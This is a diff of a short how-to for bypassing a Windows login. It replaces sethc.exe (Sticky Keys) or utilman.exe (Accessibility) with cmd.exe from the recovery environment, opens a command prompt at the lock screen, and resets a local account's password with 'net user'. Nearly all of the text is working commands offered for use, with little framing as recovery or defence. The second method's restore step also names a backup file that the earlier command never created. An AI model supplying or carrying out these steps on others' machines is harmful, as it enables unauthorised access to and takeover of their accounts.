@@ -1,27 +1,25 @@
 Method 1:
-copy c:\windows\system32\sethc.exe c:\windows\system32\sethc.exe.bak //backup sethc file.
+copy c:\windows\system32\sethc.exe c:\windows\system32\sethc.exe.bak //backup sethc file. Sethc: Sticky key is a win feature.
 copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe /y //override with cmd.
 
-Press shift 5 time cmd will open then type:
-
-net localgroup administrators 
-net user hp * //change password
+Press shift 5 times, CMD will open, then type:
+net localgroup administrators //see localgroup admin.
+net user hp * //change password.
 exit
 
-After looging in go to the winre again. Open cmd and type:
-
-copy c:\windows\system32\sethc.bak c:\windows\system32\sethc.exe
-Done.
+After logging in, go to the WinRE again. Open CMD and type:
+copy c:\windows\system32\sethc.exe.bak c:\windows\system32\sethc.exe
+del /s /q c:\windows\system32\sethc.exe.bak //delete the file.
 
 Method 2:
-copy c:\windows\system32\utilman.exe c:\windows\system32\utilman.exe.bak //backup sethc file.
+copy c:\windows\system32\utilman.exe c:\windows\system32\utilman.exe.bak //backup utilman file. utilman.exe contains Windows accessibility features.
 copy c:\windows\system32\cmd.exe c:\windows\system32\utilman.exe /y //override with cmd.
 
-Click Accessibility icon cmd will open then type:
+Click the Accessibility icon, CMD will open, then type:
 net localgroup administrators 
 net user hp * //change password
 exit
 
-After looging in go to the winre again. Open cmd and type:
+After logging in, go to the WinRE again. Open CMD and type:
 copy c:\windows\system32\utilman.bak c:\windows\system32\utilman.exe
 Done.
